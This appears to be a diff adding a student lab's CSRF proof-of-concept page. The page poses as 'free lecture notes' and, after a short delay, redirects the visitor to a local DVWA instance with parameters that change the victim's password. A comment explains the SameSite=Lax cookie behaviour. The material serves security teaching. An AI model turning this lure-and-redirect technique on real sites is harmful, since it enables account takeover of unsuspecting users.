@@ -1,0 +1,15 @@
+<!doctype html>
+<!-- Сторінка «зловмисника» (інше походження: http://localhost:8081). Лише для локального стенда РГР. -->
+<html lang="uk">
+<head><meta charset="utf-8"><title>Безкоштовні конспекти БПЗ</title></head>
+<body>
+<h1>Завантаження конспекту…</h1>
+<p>Сторінка непомітно відправляє запит до DVWA від імені жертви.</p>
+<script>
+  // Навігація верхнього рівня методом GET: cookie без SameSite (режим Lax за замовчуванням) надсилається.
+  setTimeout(function () {
+    location.href = "http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=pwned16&password_conf=pwned16&Change=Change";
+  }, 300);
+</script>
+</body>
+</html>
